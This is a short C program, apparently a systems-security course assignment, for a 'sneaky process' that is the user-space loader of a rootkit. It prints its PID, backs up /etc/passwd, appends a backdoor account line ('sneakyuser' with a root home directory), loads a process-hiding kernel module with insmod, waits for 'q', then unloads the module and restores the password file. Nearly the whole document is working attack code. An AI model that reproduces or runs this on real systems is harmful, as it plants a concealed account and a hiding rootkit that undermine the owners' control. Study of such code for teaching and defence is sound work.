// This is a sneaky process that will hide itself from the user.
// This attack program will execute system calls by calling relevant APIs((for process creation, file I/O, and receiving keyboard input from standardinput)from a user program.

// Functions:
// 1. print its own process ID to the screen, with this format:
// printf(“sneaky_process pid = %d\n”, getpid());
// 2. copy the /etc/passwd file to /tmp/passwd, and then append a new line to the end of /etc/passwd with this format:
// sneakyuser:abc123:2000:2000:sneakyuser:/root:bash

// 3. load the sneaky kernel module (sneaky_mod.ko) into kernel by calling insmod.

// 4. wait for the user to type “q” on the keyboard.

// 5. unload the sneaky kernel module from kernel by calling rmmod.

// 6. remove the line that was added to /etc/passwd in step 2.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
  printf("sneaky_process pid = %d\n", getpid());
  system("cp /etc/passwd /tmp");
  system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n\' >> /etc/passwd");

  // Load sneaky kernel module
  char message[32];
  sprintf(message, "insmod sneaky_mod.ko pid=%d", getpid());
  system(message);

  // Wait for user to type "q"
  char key_input;
  while ((key_input = getchar()) != 'q') {
  }

  // Unload sneaky kernel module
  system("rmmod sneaky_mod");
  system("cp /tmp/passwd /etc");
  system("rm -rf /tmp/passwd");
  return 0;
}
